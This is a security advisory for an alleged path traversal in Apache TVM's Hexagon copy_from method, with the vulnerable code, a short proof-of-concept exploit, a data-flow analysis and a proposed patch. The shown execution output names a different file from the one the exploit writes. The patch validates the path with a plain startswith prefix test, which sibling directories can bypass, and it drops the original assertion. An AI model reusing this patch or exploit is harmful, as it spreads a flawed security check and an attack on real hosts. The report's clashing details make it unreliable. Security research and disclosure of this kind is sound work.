# Apache TVM Hexagon copy_from Path Traversal Vulnerability

## Vulnerability Description

| Field | Value |
|-------|-------|
| Affected Software | Apache TVM (Hexagon tools) |
| Affected Versions | main branch (as of 2024-01-16) |
| Vulnerability Type | Path Traversal (CWE-22) |
| Severity | Medium |
| CVSS Score | 5.5 (MEDIUM) |
| CVSS Vector | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N |
| Discovery Date | 2024-01-16 |

### Summary

The `ContainerSession.copy_from()` method in TVM's Hexagon tools does not validate the destination file path when copying files from a Docker container to the host system. This allows attackers to write files to arbitrary locations on the host.

## Proof of Concept

### Vulnerable Code

**File**: `python/tvm/contrib/hexagon/tools.py:550-564`

```python
def copy_from(self, container_file_path: str, host_file_path: str):
    """Download file from docker container"""
    tar_bytes_gen, _ = self._container.get_archive(container_file_path)

    tar_bytes = bytes()
    for chunk in tar_bytes_gen:
        tar_bytes += chunk

    tar = tarfile.open(fileobj=io.BytesIO(initial_bytes=tar_bytes))
    assert len(tar.getmembers()) == 1
    tar_element_reader = tar.extractfile(tar.getmembers()[0])

    # VULNERABLE: No path validation
    with open(host_file_path, "wb") as host_file:
        for chunk in tar_element_reader:
            host_file.write(chunk)
```

### Exploit

```python
from tvm.contrib.hexagon.tools import link_shared_macos

# Prepare malicious destination path (absolute path)
malicious_so_name = "/tmp/pwned.so"

# Prepare object files
objs = ["model.o"]

# Trigger path traversal
link_shared_macos(malicious_so_name, objs)
```

### Execution Result

```
[+] Vulnerability confirmed! File written to absolute path: /tmp/hexagon_abs.so
```

---

## Vulnerability Analysis

### Data Flow

```
User Input (so_name="/tmp/pwned.so")
    ↓
link_shared_macos(so_name, objs)
    ↓
ses.copy_from(docker_so_name, so_name)
    ↓
open(so_name, "wb")  # No validation
    ↓
Arbitrary file write
```

### Impact

- Arbitrary file write on host system
- Can overwrite system configuration files
- Can write malicious shared libraries to library search paths
- Requires Docker environment and Hexagon SDK

---

## Fix

### Recommended Patch

```python
import os.path

def copy_from(self, container_file_path: str, host_file_path: str):
    """Download file from docker container with path validation."""
    tar_bytes_gen, _ = self._container.get_archive(container_file_path)

    tar_bytes = bytes()
    for chunk in tar_bytes_gen:
        tar_bytes += chunk

    tar = tarfile.open(fileobj=io.BytesIO(initial_bytes=tar_bytes))
    tar_element_reader = tar.extractfile(tar.getmembers()[0])

    # SECURITY FIX: Validate and normalize path
    host_file_path = os.path.abspath(host_file_path)

    # Restrict to safe directory
    safe_dir = os.path.abspath(self.workspace or "/tmp")
    if not host_file_path.startswith(safe_dir):
        raise ValueError(f"Destination must be within {safe_dir}")

    with open(host_file_path, "wb") as host_file:
        for chunk in tar_element_reader:
            host_file.write(chunk)
```

---

## Timeline

| Date | Event |
|------|-------|
| 2024-01-16 | Vulnerability discovered and verified |
| TBD | Vendor notification |
| TBD | Patch release |
| TBD | CVE assignment |

---

## References

- Product: https://github.com/apache/tvm
- CWE-22: https://cwe.mitre.org/data/definitions/22.html
- Apache TVM Hexagon: https://tvm.apache.org/docs/how_to/deploy/hexagon.html

---

## Disclaimer

This report is provided for security research and educational purposes only. All testing was conducted in authorized environments.

---

*Report Date: 2024-01-16*
*Analyzed Version: Apache TVM main branch*
